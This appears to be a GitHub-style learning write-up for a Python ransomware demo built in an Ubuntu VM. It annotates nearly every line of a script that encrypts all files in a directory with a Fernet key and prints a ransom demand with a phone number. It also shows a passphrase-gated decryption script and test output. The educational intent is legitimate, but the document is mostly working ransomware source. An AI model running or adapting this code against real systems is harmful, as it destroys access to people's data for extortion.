## Ransomware

Ransomware deployment using Python scripting

## Objective

As ransomware attacks have been on a steady upward trend, I wanted to take the time to understand the mechanics of one of the most popular cyberattacks methods.

### Skills Learned


- Python scripting
- Cryptography
 

### Tools Used

- Python
- Linux VM  
- Fernet

## Steps

First we are going to spin up an Ubuntu VM

Next we will create a directory with several files that we are going to test our ransomware on.

So we insert into the CLI "mkdir ransomware" to create the directory and inside the directory, run "echo "file content" > filename.txt" a few times to create several files.

      Next we will create the Python script file.

To make this project easier to read I will briefly notate each line of code seperated by "//" to explain its utility in the script.

First we have to include the shebang #! so that Linux runs the file as a script.

Import os // allows python to interact with the OS.

from cryptography.fernet import Fernet // 128bit AES

files = [] // This will create an empty list called files.

for file in os.listdir() // This is a for loop and will list all the files in the directory.

if os.path.isfile(file) // if object is a file add to encryption list

if file == "MALWARE.py" or file == "thekey.key" or file == "DECRYPT.py" : (next line)continue(next line) files.append(file) // This is seperating our script files that are in the same directory from the file list we created earlier in the script.

print(files) // Will display the "files" list in the terminal.

ref: test print

key = Fernet.generate_key() // This will generate the encryption key.

with open("thekey.key", "wb") as thekey: // This line uses the open function to open the file in script in write mode and reference the variable as "thekey" throughout the script.

for file in files: // This is creating a loop for the file's in the files list created earlier.

with open(file, "rb") as thefile: // This line will open the file's in the list in read binary mode and assigned the alias "thefile".

contents = thefile.read() // we have now made contents a alias to the file.read.

contents_encrypted = Fernet(key).encrypt(contents) // This line encrypt the contents with the Fernet key.

with open(file, "wb") as thefile: // sets script to write to "thefile".

thefile.write(contents_encrypted) // writes the "contents_encrypted" to the file.

print("All of your files have been encrypted. Contact 890-589-5542 to decrypt your data, for a price") // This is displayed in the terminal when the Python script is executed

DECRYPT

![Decryption](https://github.com/user-attachments/assets/5d1837e5-909c-4cf7-9fe0-a973e5fd3e94)

ref:

The first half of the script from the beginning up until the "print(files)" line is the same as the MALWARE.py script, I will not reiterate these lines for obvious reasons.

with open("thekey.key", "rb") as key: // opens key file in read binary mode making "key" a variable.

secretkey = key.read() // The "secretkey" equals the contents of the file variable assigned as "key", the ".read" will make the encryption key functional in the decryption portion of the script.

secretphrase = "112113114" // This is going to be the secret password that decrypts the files.

user_phrase = input("Enter the secret phrase to decrypt your files\n") // input is going to allow the user to type the password into the terminal.  

if user_phrase == secretphrase: // If the password is entered correctly by the user, the nested for loop will execute.

The code of the for loop is going to remain very similar to the for loop in the MALWARE.py script with a few small changes. 

contents_decrypted = Fernet(secretkey).decrypt(contents) // This decrypts the files using the decryption key generated by Fernet. 

thefile.write(contents_decrypted) // The contents are now written back to the file.

print("Files decrypted, thank you for your business") // the last sequence of our if statement will print this message informing the user that their files have been decrypted.

else: // If  the "if" statement is false the else statement will run.

print("Wrong passphrase") // When the user inputs an incorrect password upon being prompted for the secret phrase, this output will print in the terminal.


Lets test our scripts!

![results](https://github.com/user-attachments/assets/ef007d90-74cf-40ae-b97d-67d0827bd6ac)

cat file2.txt // This will display the contents of a the files.

cat thekey.key // Here I am showing the 128bit encryption key, this file is appended from the file list that becomes encrypted in our MALWARE.py script, 
if our encryption key got encrypted, it would be a messy situation.

python3 MALWARE.py // We have now executed our Python script in the directory. 

You now see a list of the files encrypted and our message we left for the user on who to contact to decrypt the files, for a price.

cat file2.txt // As you can see, the data in file is now encrypted.

python3 DECRYPT.py // Now that the files have been encrypted lets decrypt them with our decryption script.

The script prompts us for the secret phrase which was set in the DECRYPT.py script.

We then get a message thanking us for our business, and that the files have been decrypted.

cat file2.txt // Now when we check our file we have the original contents of the file because our data has been decrypted.
